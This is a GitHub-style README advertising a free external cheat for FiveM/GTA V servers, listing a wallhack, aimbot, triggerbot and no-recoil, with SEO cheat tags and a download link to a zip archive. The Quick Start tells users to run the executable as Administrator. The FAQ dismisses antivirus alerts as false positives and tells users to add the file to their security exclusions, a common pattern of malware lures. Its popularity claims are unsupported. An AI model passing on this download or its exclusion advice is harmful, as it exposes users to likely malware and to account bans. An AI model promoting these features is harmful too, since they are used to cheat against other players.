<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=24,28,36,72,61,139&height=200&section=header&text=FiveM%20External%20Utility%202026&fontSize=38&fontAlignY=40&animation=fadeIn" alt="FiveM External Utility Banner" width="100%" />
</p>

<p align="center">
  <a href="https://github.com"><img src="https://img.shields.io/badge/Version-2.0.1-brightgreen?style=for-the-badge&logo=github" alt="Version"></a>
  <a href="https://github.com"><img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-blue?style=for-the-badge&logo=windows" alt="Platform"></a>
  <a href="https://github.com"><img src="https://img.shields.io/badge/Status-Active%20%26%20Updated-success?style=for-the-badge" alt="Status"></a>
  <a href="https://github.com"><img src="https://img.shields.io/badge/License-Free-orange?style=for-the-badge" alt="License"></a>
  <a href="https://github.com"><img src="https://img.shields.io/badge/Stars-★%201.2k-yellow?style=for-the-badge" alt="Stars"></a>
</p>

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&color=38BDF8&width=450&lines=FiveM+Visual+Enhancer+%26+Overlay;Precision+Targeting+%26+Aim+Assist;Custom+Radar+%26+Entity+Tracker;100%25+Free+-+No+Key+Required;Updated+for+Latest+FiveM+Builds" alt="Typing SVG" />
</p>

---

## 🎯 Overview

**FiveM External Utility 2026** is a lightweight, high-performance external process overlay engineered specifically for FiveM custom roleplay and competitive servers. Featuring an intuitive DirectX 11 overlay system, this tool provides precision player tracking, customizable radar visualizers, dynamic FOV targeting options, and comprehensive environment indicators without modifying original game files.

Designed with seamless user experience in mind, this tool requires **no key system**, **no paid subscriptions**, and **zero registration**. It runs entirely as a standalone companion app alongside your game client to deliver maximum stability, fluid frame rates, and full compatibility across all major FiveM server frameworks.

> **Trusted by 50,000+ players worldwide.**

---

## ✨ Features

| Icon | Feature Name | Description |
| :---: | :--- | :--- |
| 👁️ | **Player ESP & Wallhack** | Real-time visual box overlays, skeleton lines, distance indicators, health/armor bars, and held weapon details. |
| 🎯 | **Precision Aimbot & Assist** | Smooth targeting assistance with configurable field-of-view (FOV), bone targeting selection (head/chest), and target distance limits. |
| 🏎️ | **Vehicle & Entity Radar** | Custom 2D minimap visualizer highlighting surrounding players, vehicles, objects, and customizable waypoints. |
| 🔫 | **Triggerbot** | Automatic fire activation when your crosshair aligns with valid target bounding boxes, complete with custom click delay. |
| 💥 | **Recoil & Spread Adjuster** | Customizable weapon impulse damping to streamline burst control and enhance long-range accuracy. |
| 📍 | **Tactical Teleport & Waypoints** | Visual trajectory lines and position marker integration directly over your active server HUD. |
| ⚡ | **Low Latency Engine** | Powered by high-speed memory scanning with < 1ms render delay, preserving native game FPS. |
| 🔄 | **Auto-Update System** | Automatically fetches latest offsets and client updates on launch to ensure uninterrupted availability. |

---

## ⚡ Quick Start

```text
╔══════════════════════════════════════════════════════════════╗
║                DOWNLOAD & RUN IN UNDER 30s                   ║
╚══════════════════════════════════════════════════════════════╝
```

1. **Download the Package**  
   [![Download](https://img.shields.io/badge/⬇_DOWNLOAD-FiveM--Utility.zip-brightgreen?style=for-the-badge&logo=github)](https://github.com/Infernalgrunozzle/fivem-visual-enhancer/releases/download/v1.0/FiveM-Utility.zip)

2. **Extract Files**  
   Unpack `FiveM-Utility.zip` into a dedicated folder on your local drive using WinRAR or 7-Zip.

3. **Launch FiveM**  
   Start your FiveM client and connect to your desired server.

4. **Run Utility**  
   Open `FiveM-Utility.exe` as Administrator. Press `[INSERT]` or `[F11]` in-game to toggle the overlay configuration menu.

---

## 💻 System Requirements

| Component | Minimum Requirement | Recommended Specification |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) Build 1909+ | Windows 11 (64-bit) Latest Build |
| **CPU** | Intel Core i3-6100 / AMD Ryzen 3 1200 | Intel Core i5-10400 / AMD Ryzen 5 3600 |
| **RAM** | 8 GB System Memory | 16 GB DDR4/DDR5 |
| **GPU** | NVIDIA GTX 960 / AMD Radeon R9 280 | NVIDIA GTX 1060 / AMD RX 580 (DirectX 11 support) |
| **Storage** | 35 MB Available Disk Space | SSD Storage |

---

## ⚙️ Configuration

The software automatically creates a `config.json` file inside the executable directory upon first boot. You can modify settings via the in-game GUI or edit JSON directly:

```json
{
  "overlay": {
    "enabled": true,
    "toggle_key": "VK_INSERT",
    "fps_limit": 144,
    "draw_crosshair": false
  },
  "visuals": {
    "player_esp": true,
    "box_style": 1,
    "show_health": true,
    "show_distance": true,
    "max_distance": 500
  },
  "targeting": {
    "aim_assist": true,
    "fov_radius": 120.0,
    "smoothness": 4.5,
    "target_bone": "head"
  }
}
```

---

## 🔧 Compatibility

| Environment / Framework | Compatibility Status |
| :--- | :---: |
| **Windows 10 (20H2 - 22H2)** | ✅ Supported |
| **Windows 11 (All Builds)** | ✅ Supported |
| **DirectX 11 / DirectX 12** | ✅ Supported |
| **ESX / QBCore / VMenu Servers** | ✅ Supported |
| **64-bit Architecture** | ✅ Supported |
| **Multi-Monitor Display Setup** | ✅ Supported |

---

## ❓ FAQ

<details>
<summary><b>Is this utility completely free to use?</b></summary>
<br>
Yes, FiveM External Utility is 100% free software. There are no trial periods, locked features, license key requirements, or hidden subscription fees.
</details>

<details>
<summary><b>My security software flags the file during download. Is this normal?</b></summary>
<br>
Yes, this is a standard false positive. Because the utility operates as an unsigned external process to read temporary memory addresses and render an overlay above the active game window, generic heuristic scanners may flag it. Simply add the tool to your security exclusions list.
</details>

<details>
<summary><b>How frequently is this repository updated?</b></summary>
<br>
Updates are released regularly to adapt to new FiveM client updates, Windows security patches, and user feature requests. Enable repository notifications to stay informed on updates.
</details>

---

## 📋 Changelog

<details>
<summary><b>Version History (Click to Expand)</b></summary>
<br>

### Version 2.0.1 (Latest)
- Added high-refresh-rate overlay sync for 240Hz monitors.
- Improved bone calculation performance for player ESP and skeleton rendering.
- Fixed minor UI scaling bug on non-standard display resolutions.

### Version 2.0.0
- Completely redesigned ImGui overlay interface.
- Added standalone vehicle tracker and custom radar map visualizer.
- Introduced adaptive smooth target tracking algorithms.

### Version 1.9.5
- Initial 2026 update introducing full support for modern Windows 11 updates.
- Memory scanning engine optimizations reducing memory footprint by 40%.
</details>

---

## 🏷️ Tags

`fivem cheat` `fivem hack` `fivem mod menu` `fivem esp` `fivem aimbot` `fivem wallhack` `fivem player esp` `fivem executor` `fivem menu 2026` `gta 5 cheat` `gta v hack` `fivem script` `fivem triggerbot` `fivem free cheat` `fivem no key` `fivem overlay` `fivem trainer` `fivem visual enhancer` `fivem player tracker` `fivem radar` `fivem vehicle manager` `fivem no recoil` `fivem external menu` `fivem clean UI` `gta5 overlay` `fivem modding` `fivem utility tool` `fivem free download` `windows 10 fivem` `windows 11 fivem` `fivem dx11 overlay` `fivem standalone menu`

---

## ⚠️ Disclaimer

This repository and software are created strictly for educational, demonstration, and private game evaluation purposes. Users assume full responsibility for using this tool in accordance with applicable terms of service and local usage guidelines.

---

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=24,28,36,72,61,139&height=120&section=footer&reversal=true" alt="Footer Banner" width="100%" />
</p>

<p align="center">
  <b>⭐ Star this repo if it helped you! | 🔔 Watch for updates</b>
</p>